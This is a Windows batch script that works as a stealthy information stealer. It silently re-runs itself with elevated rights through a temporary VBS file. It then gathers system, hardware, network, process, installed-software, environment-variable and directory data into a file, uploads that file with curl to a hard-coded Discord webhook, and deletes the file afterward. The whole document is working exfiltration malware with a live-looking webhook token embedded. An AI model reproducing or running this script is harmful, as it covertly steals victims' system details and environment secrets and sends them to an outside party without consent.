@echo off
setlocal EnableDelayedExpansion

:: ===========================
:: Elevate Privileges (Hidden)
:: ===========================
if "%~1" neq "hidden" (
    >"%temp%\elevate.vbs" (
        echo Set UAC = CreateObject("Shell.Application"^)
        echo UAC.ShellExecute "%~f0", "hidden", "", "runas", 0
    )
    cscript //nologo "%temp%\elevate.vbs" >nul
    del "%temp%\elevate.vbs"
    exit /B
)

:: ===============
:: Configuration
:: ===============
set "output=info.txt"
set "webhook=https://discordapp.com/api/webhooks/1358556617703952465/iHuxaShf-UGFu-XbjoMEs3gU2HNlw6WWF8Lbbr69y_WtzXpVnE85zKpFEYwiAMZzoS9V"

:: =========================
:: Collect Detailed System Info
:: =========================
(
    echo [ SYSTEM INFO ]
    echo --------------------------
    systeminfo
    echo.

    echo [ CPU INFO ]
    echo --------------------------
    wmic cpu get Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed
    echo.

    echo [ GPU INFO ]
    echo --------------------------
    wmic path win32_VideoController get name, adapterram, driverversion
    echo.

    echo [ RAM INFO ]
    echo --------------------------
    wmic memorychip get capacity, speed, devicelocator, manufacturer
    echo.

    echo [ STORAGE INFO ]
    echo --------------------------
    wmic logicaldisk get caption, description, filesystem, freespace, size
    echo.

    echo [ NETWORK CONFIG ]
    echo --------------------------
    ipconfig /all
    echo.

    echo [ ACTIVE NETWORK PORTS ]
    echo --------------------------
    netstat -anob
    echo.

    echo [ NETWORK INTERFACES ]
    echo --------------------------
    wmic nicconfig get Description, DHCPEnabled, MACAddress, IPAddress, IPSubnet
    echo.

    echo [ INSTALLED SOFTWARE ]
    echo --------------------------
    wmic product get Name, Version
    echo.

    echo [ RUNNING PROCESSES ]
    echo --------------------------
    tasklist
    echo.

    echo [ USER ENVIRONMENT VARIABLES ]
    echo --------------------------
    set
    echo.

    echo [ CURRENT DIRECTORY CONTENTS ]
    echo --------------------------
    dir /b /a
) > "%output%"

:: =========================
:: Upload to Discord Webhook
:: =========================
curl -s -F "file=@%output%" "%webhook%" >nul

:: =========================
:: Cleanup
:: =========================
del "%output%" >nul 2>&1
endlocal
exit /B
